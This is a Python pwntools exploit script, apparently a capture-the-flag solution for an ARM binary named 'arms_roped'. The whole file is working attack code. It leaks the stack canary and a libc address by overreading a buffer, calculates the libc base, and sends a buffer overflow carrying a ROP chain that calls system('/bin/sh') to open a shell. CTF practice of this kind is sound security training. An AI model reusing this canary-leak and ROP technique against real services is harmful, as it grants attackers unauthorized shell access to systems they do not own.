import itertools
import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

is_local = sys.argv[1] in {'127.0.0.1', 'localhost'}

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'arms_roped'
libc_path = Path('/usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3') if is_local else parent_dir / 'libc.so.6'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF(libc_path, checksec=False)

canary_stack_offset = 0x20
stack_stack_offset = 0x2B
rtld_global_ro_stack_offset = 0x78

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start(exe=str(exe), gdb_script=gdb_script)


def leak_stack_offset(stack_offset: int) -> bytes:
    io.sendline(b'!' * stack_offset)
    io.recvuntil(b'\n')
    io.sendline(b'!')
    io.recv(stack_offset, timeout=1)
    return io.recvuntil(b'\n', drop=True)


info(f'Leaking stack...')
stack_data = bytearray()
while len(stack_data) < 0x80:
    leaked_stack_data = leak_stack_offset(len(stack_data) + 0x20)
    if len(leaked_stack_data) == 0x0:
        stack_data.append(0x0)
    else:
        stack_data.extend(leaked_stack_data)

stack_dwords = list(map(u32, map(bytes, itertools.batched(stack_data, 4))))
info('Stack:\n' + '\n'.join(map(hex, stack_dwords)))

leaked_canary = stack_dwords[0]
success(f'Stack canary: {hex(leaked_canary)}')

some_libc_address = stack_dwords[10]
success(f'Address in libc: {hex(some_libc_address)}')
libc.address = some_libc_address - 0x17525
success(f'Calculated libc base address: {hex(libc.address)}')

pop_r0_r4_pc_gadget = libc.address + 0x5bebc

info(f'Pwning via ROP...')
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
io.sendline(b''.join([b'a' * 32,
                      p32(leaked_canary),
                      p32(0x0) * 3,
                      p32(pop_r0_r4_pc_gadget),
                      p32(bin_sh_addr),
                      p32(0x0),
                      p32(libc.symbols['system'])]))
io.interactive()
